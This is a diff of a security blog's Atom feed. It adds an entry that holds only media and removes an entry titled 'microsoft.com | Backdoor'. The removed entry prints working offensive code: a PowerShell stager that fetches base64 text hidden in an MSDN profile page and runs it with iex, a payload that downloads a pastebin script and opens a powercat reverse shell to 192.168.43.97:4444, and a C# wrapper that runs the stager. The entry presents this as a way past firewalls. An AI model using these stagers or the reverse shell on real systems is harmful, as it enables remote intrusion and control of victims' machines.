@@ -45,6 +45,24 @@
   </entry>
   
   <entry>
+    <title>shad0w</title>
+    <link href="www.ggsec.cn/shad0w.html"/>
+    <id>www.ggsec.cn/shad0w.html</id>
+    <published>2020-06-13T03:04:27.000Z</published>
+    <updated>2020-06-13T03:10:40.331Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BCC4E156881763FAB4935596257781F1.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/shad0w.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1592017665245.jpg" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/BCC4E156881763FAB4935596257781F1.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>AppLockerList</title>
     <link href="www.ggsec.cn/appLockerList1.html"/>
     <id>www.ggsec.cn/appLockerList1.html</id>
@@ -406,28 +424,6 @@
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD450A6C1396CD080BC2012A9183FBCD.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>microsoft.com |  Backdoor</title>
-    <link href="www.ggsec.cn/microsoft-backdoor.html"/>
-    <id>www.ggsec.cn/microsoft-backdoor.html</id>
-    <published>2019-07-12T11:52:52.000Z</published>
-    <updated>2019-07-12T12:00:54.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/43A9BE1A3DFB57062DC24452F9932638.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/microsoft.com|Backdoor.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line"></span><br><span class="line">powershell -ep bypass /w <span class="number">1</span> /C New-Item -ItemType file <span class="string">'C:\Users\\\$env:USERNAME\Documents\pwn_sauce'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf '%s' "powershell -ep bypass /w 1 /C New-Item -ItemType file 'C:\Users\\\$env:USERNAME\Documents\pwn_sauce'" | base64 | tr -d '\n'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$wro</span> = iwr -Uri https:<span class="comment">//social.msdn.microsoft.com/Profile/xxxxxxxx -UseBasicParsing;$r = [Regex]::new("(?&lt;=START)(.*)(?=END)");$m = $r.Match($wro.rawcontent);if($m.Success)&#123; $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAYLOAD:</span><br><span class="line"></span><br><span class="line">IEX (New-Object System<span class="selector-class">.Net</span><span class="selector-class">.Webclient</span>).DownloadString(<span class="string">'https://pastebin.com/raw/xxxxxx’);powercat -c 192.168.43.97 -p 4444 -e cmd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXP:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">printf '%s' "IEX (New-Object System.Net.Webclient).DownloadString('https://pastebin.com/raw/xxxxx’);powercat -c 192.168.43.97 -p 4444 -e cmd" | base64 | tr -d '\n'</span><br><span class="line"></span><br><span class="line">STARTXXXXXEND</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.Management.Automation;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        </span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            PowerShell ps = PowerShell.Create();</span><br><span class="line">            ps.AddScript("$wro = iwr -Uri https://social.msdn.microsoft.com/Profile/xxxxx6 -UseBasicParsing;$r = [Regex]::new(\"(?&lt;=START)(.*)(?=END)\");$m = $r.Match($wro.rawcontent);if($m.Success)&#123; $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p &#125;");</span><br><span class="line">            ps.Invoke();</span><br><span class="line">           </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/000410855D5706B078C3B68ABA7B3449.jpg" alt="enter description here"><br><a href="https://pastebin.com" target="_blank" rel="noopener">https://pastebin.com</a><br><a href="https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/" target="_blank" rel="noopener">https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/43A9BE1A3DFB57062DC24452F9932638.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
     
     </summary>
     
